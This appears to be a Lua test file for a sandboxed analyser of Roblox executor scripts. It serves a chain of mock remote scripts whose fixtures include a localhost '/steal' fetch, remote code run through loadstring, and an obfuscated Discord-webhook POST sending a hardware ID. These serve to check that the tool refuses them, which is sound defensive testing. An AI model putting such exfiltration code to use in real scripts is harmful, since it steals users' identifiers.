-- spider test: fake executor request() serving a chain of scripts.   texlua tests/run_spider.lua
local pages = {
  ["https://example.com/a.lua"] = [[
    -- page A: loads B, tries localhost + a discord GET (both must be refused)
    local rq = game:HttpGet("http://127.0.0.1:8080/steal")
    local d  = game:HttpGet("https://discord.com/api/webhooks/1/x")
    print("A running")
    loadstring(game:HttpGet("https://example.com/b.lua"))()
  ]],
  ["https://example.com/b.lua"] = [[
    local k = {"POST", "payload", "deep"}
    local function d(s) return (s:gsub(".", function(c) return string.char(c:byte() + 0) end)) end
    local url = d("https://disc" .. "ord.com/api/webhooks/99/zz")
    request({Url = url, Method = k[1], Body = "hwid=" .. gethwid()})
    local c = game:HttpGet("https://example.com/c.lua")
    print("B done", #c)
  ]],
  ["https://example.com/c.lua"] = [[ print("C leaf") ]],
}
local seen = {}
request = function(o)       -- the "real" executor request
  seen[#seen + 1] = o.Method .. " " .. o.Url
  local body = pages[o.Url]
  if body then return { StatusCode = 200, Body = body } end
  return { StatusCode = 404, Body = "" }
end
BlackSpiderConfig = {
  SOURCE = "local", LOCAL_DIR = ".", OUT_DIR = "tests/out", TIME_LIMIT = 20, ECHO_PRINT = true,
  TARGET_CODE = 'loadstring(game:HttpGet("https://example.com/a.lua"))()',
  SPIDER = (arg[1] ~= "nospider"), HOST_LOCK = true,
}
dofile("loader.lua")
print("\n--- real request() calls the fetcher made:")
for _, s in ipairs(seen) do print("  " .. s) end
print("--- host request restored after run: " .. tostring(request ~= nil and select(2, pcall(request, {Method="GET", Url="https://example.com/c.lua"})).StatusCode))
